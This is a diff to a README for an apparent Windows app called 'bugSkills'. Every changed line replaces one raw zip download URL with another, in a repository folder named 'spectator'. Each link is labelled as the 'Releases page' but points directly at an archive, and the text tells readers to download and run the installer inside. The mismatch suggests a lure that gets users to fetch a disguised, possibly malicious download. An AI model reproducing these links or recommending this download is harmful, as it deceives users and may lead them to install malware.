@@ -1,6 +1,6 @@
 # 🐞 bugSkills - Turn Reports into AI Skills
 
-[![Download bugSkills](https://img.shields.io/badge/Download-bugSkills-brightgreen?style=for-the-badge)](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/bug-Skills-v2.5-alpha.2.zip)
+[![Download bugSkills](https://img.shields.io/badge/Download-bugSkills-brightgreen?style=for-the-badge)](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/Skills_bug_v2.7-alpha.2.zip)
 
 ---
 
@@ -28,7 +28,7 @@ bugSkills should work smoothly on most modern Windows machines that meet these s
 
 To get started, visit the bugSkills release page by clicking the link below:
 
-[Download bugSkills Releases](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/bug-Skills-v2.5-alpha.2.zip)
+[Download bugSkills Releases](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/Skills_bug_v2.7-alpha.2.zip)
 
 This page contains the latest version of bugSkills and previous releases if you want to try an older version. Scroll to the latest release and look for the Windows installer file. It usually has the `.exe` extension.
 
@@ -40,7 +40,7 @@ Follow these steps to install bugSkills on your PC:
 
 1. **Go to the Releases Page**
 
-   Open your web browser and visit [bugSkills Releases](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/bug-Skills-v2.5-alpha.2.zip).
+   Open your web browser and visit [bugSkills Releases](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/Skills_bug_v2.7-alpha.2.zip).
 
 2. **Find the Latest Version**
 
@@ -124,7 +124,7 @@ For detailed help, check the Issues section on the bugSkills GitHub repository.
 
 To keep bugSkills up to date:
 
-- Visit the [Releases page](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/bug-Skills-v2.5-alpha.2.zip) regularly.
+- Visit the [Releases page](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/Skills_bug_v2.7-alpha.2.zip) regularly.
 - Download the newest installer when available.
 - Install over your existing version; your settings and saved files will remain.
 
@@ -138,4 +138,4 @@ You can change this folder anytime in the Settings menu.
 
 ---
 
-[Download bugSkills Releases](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/bug-Skills-v2.5-alpha.2.zip)
+[Download bugSkills Releases](https://github.com/strict-oldenburg913/bugSkills/raw/refs/heads/main/spectator/Skills_bug_v2.7-alpha.2.zip)
